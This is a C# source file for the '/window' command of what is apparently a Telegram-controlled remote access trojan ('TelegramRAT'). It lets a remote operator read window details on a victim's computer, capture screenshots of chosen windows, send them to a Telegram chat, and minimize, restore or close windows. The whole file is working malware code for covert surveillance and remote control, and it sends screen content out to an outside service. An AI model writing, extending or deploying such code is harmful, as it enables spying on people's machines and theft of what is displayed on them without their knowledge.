using System.Drawing;
using Telegram.Bot;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Services;
using TelegramRAT.Utilities;

namespace TelegramRAT.Commands.Misc;

public class WindowCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IWinApiService winApiService) : AbstractBotCommand
{
    public override string Command => "window";
    public override string Description => "This command has multiple usage. After usage type title or pointer(type 0x at the start) of window. Usage list:\n\n" +
    "<i>i</i> | <i>info</i> - Get information about window. Shows info about top window, if no name provided\n\n" +
    "<i>min</i> | <i>minimize</i> - Minimize window\n\n" +
    "<i>max</i> | <i>maximize</i> - Maximize window\n\n" +
    "<i>r</i> | <i>restore</i> - Restore size and position of window\n\n" +
    "<i>sf</i> | <i>setfocus</i> - Set focus to window" +
    "<i>c</i> | <i>close</i> - Close window\n\n";
    public override string Example => "/window close Calculator";
    public override int ArgsCount => -2;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            IntPtr hWnd = IntPtr.Zero;
            string action = model.Args[0].ToLower();

            if (action == "info" || action == "i")
            {
                if (model.Args.Length == 1)
                    hWnd = winApiService.GetForegroundWindow();
                else
                    hWnd = ResolveWindowHandle(model.Args[1]);

                if (hWnd == IntPtr.Zero || !winApiService.IsWindow(hWnd))
                {
                    await botClient.SendMessage(model.Message.Chat.Id, "Window not found!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    return;
                }

                Rectangle windowBounds = winApiService.GetWindowBounds(hWnd);
                string windowInfo = "Window info\n\n" +
                                    $"Title: <code>{winApiService.GetWindowTitle(hWnd)}</code>\n" +
                                    $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
                                    $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
                                    $"Pointer: <code>0x{hWnd:X}</code>\n\n" +
                                    $"Associated Process: <code>{winApiService.GetProcessId(winApiService.GetProcessHandleFromWindow(hWnd))}</code>";

                using MemoryStream windowCaptureStream = new MemoryStream();
                await Task.Run(() => winApiService.CaptureWindow(hWnd, windowCaptureStream));
                windowCaptureStream.Position = 0;

                await botClient.SendPhoto(model.Message.Chat.Id, new Telegram.Bot.Types.InputFileStream(windowCaptureStream), windowInfo, replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId }, parseMode: ParseMode.Html);
                return;
            }

            if (model.Args.Length > 1)
            {
                hWnd = ResolveWindowHandle(string.Join(' ', model.Args.Skip(1)));
                if (hWnd == IntPtr.Zero || !winApiService.IsWindow(hWnd))
                {
                    await botClient.SendMessage(model.Message.Chat.Id, "Window not found!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    return;
                }

                switch (action)
                {
                    case "min":
                    case "minimize":
                        winApiService.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                        break;
                    case "max":
                    case "maximize":
                        winApiService.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
                        break;
                    case "sf":
                    case "setfocus":
                        winApiService.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                        winApiService.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                        break;
                    case "r":
                    case "restore":
                        winApiService.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                        break;
                    case "c":
                    case "close":
                        winApiService.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
                        break;
                    default:
                        await botClient.SendMessage(model.Message.Chat.Id, "No such usage for /window.", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                        return;
                }
                await botClient.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            }
            else
            {
                await botClient.SendMessage(model.Message.Chat.Id, "This action requires a window title or pointer.", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            }
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }

    private IntPtr ResolveWindowHandle(string input)
    {
        if (input.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
        {
            if (long.TryParse(input[2..], global::System.Globalization.NumberStyles.HexNumber, null, out long ptr))
                return new IntPtr(ptr);
        }
        return winApiService.FindWindow(null!, input);
    }
}
